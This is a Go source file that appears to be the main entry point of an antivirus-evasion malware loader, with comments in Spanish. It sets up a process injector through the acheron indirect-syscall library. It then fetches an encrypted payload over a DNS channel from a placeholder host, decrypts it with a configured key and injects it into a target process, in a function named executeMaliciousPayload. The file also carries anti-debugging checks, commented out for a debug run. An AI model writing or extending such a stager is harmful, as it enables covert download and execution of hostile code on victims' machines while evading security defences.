package main

import (
	"encoding/base64"
	"evasion-av/config"
	anti_analysis "evasion-av/internal/anti-analysis"
	injection "evasion-av/internal/injection"
	"evasion-av/internal/transport"
	"fmt"
	"io"
	"log"
	"os"
	"runtime"
	"time"

	"github.com/f1zm0/acheron"
)

func main() {
	// Logger y manejo de panic
	defer func() {
		if r := recover(); r != nil {
			log.Printf("Panic capturado: %v\n", r)
			buf := make([]byte, 1<<16)
			stackSize := runtime.Stack(buf, true)
			log.Printf("[STACK TRACE]\n%s\n", string(buf[:stackSize]))
		}
	}()

	// Abrir archivo log
	logFile, err := os.OpenFile("C:\\Users\\Public\\log.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)

	if err != nil {
		fmt.Fprintf(os.Stderr, "No se pudo abrir log.txt: %v\n", err)
		return
	}
	defer logFile.Close()

	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.SetOutput(io.MultiWriter(logFile))

	log.Println("=== Ejecución iniciada (modo debug) ===")

	// 🔻 DESACTIVADO: Anti-debugging
	// defenses := anti_analysis.NewDefensiveMeasures()
	// debugCheck := anti_analysis.NewDebuggingCheck()
	// if debugCheck.IsDebugged() {
	// 	log.Println("Debugging detectado en inicio")
	// 	defenses.Activate()
	// 	logFile.Sync()
	// 	return
	// }

	// 🔻 DESACTIVADO: monitor en segundo plano
	// monitorChan := make(chan struct{})
	// go startAntiDebugMonitor(debugCheck, monitorChan)

	// Inicializar Acheron
	ach, err := acheron.New()
	if err != nil {
		log.Println("Error inicializando Acheron:", err)
		logFile.Sync()
		return
	}
	log.Println("[Checkpoint] Acheron inicializado")

	// Inyección
	injectionType, err := injection.FromString(config.InjectionType)
	if err != nil {
		log.Println("Error obteniendo tipo de inyección:", err)
		logFile.Sync()
		return
	}
	log.Println("[Checkpoint] Tipo de inyección:", config.InjectionType)

	injector, err := injection.NewInjector(injectionType, ach)
	if err != nil {
		log.Println("Error creando injector:", err)
		logFile.Sync()
		return
	}
	log.Println("[Checkpoint] Inyector configurado")

	// Ejecutar payload directamente
	executeMaliciousPayload(injector)

	log.Println("Ejecución finalizada. Esperando indefinidamente...")
	logFile.Sync()
}

func startAntiDebugMonitor(check *anti_analysis.DebuggingCheck, stopChan chan<- struct{}) {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if check.IsDebugged() {
				log.Println("Debugging detectado por monitor")
				close(stopChan)
				return
			}
		}
	}
}

func getKeyBytes() []byte {
	key, err := base64.StdEncoding.DecodeString(config.EncryptionKey)
	if err != nil {
		log.Fatalf("Error decodificando clave base64: %v", err)
	}
	return key
}
func executeMaliciousPayload(injector injection.ProcessInjector) {
	targetProcess := config.TargetProcess
	log.Println("TargetProcess:", targetProcess)

	payload := getEncryptedPayload()
	if len(payload) == 0 {
		log.Println("Payload vacío o error al obtenerlo")
		return
	}

	err := injector.Inject(targetProcess, payload)
	if err != nil {
		log.Println("Error en inyección:", err)
		return
	}

	log.Println("Payload ejecutado exitosamente")
}

func getEncryptedPayload() []byte {
	key := getKeyBytes()
	client, err := transport.NewSecureDNSClient("dummy.local", "bin", key, config.EvasiveMode)
	if err != nil {
		log.Println("Error creando cliente DNS:", err)
		return nil
	}

	payload, err := client.DownloadAndDecrypt()
	if err != nil {
		log.Println("Error descargando y descifrando payload:", err)
		return nil
	}

	log.Println("Payload descargado y descifrado. Tamaño:", len(payload))
	return payload
}
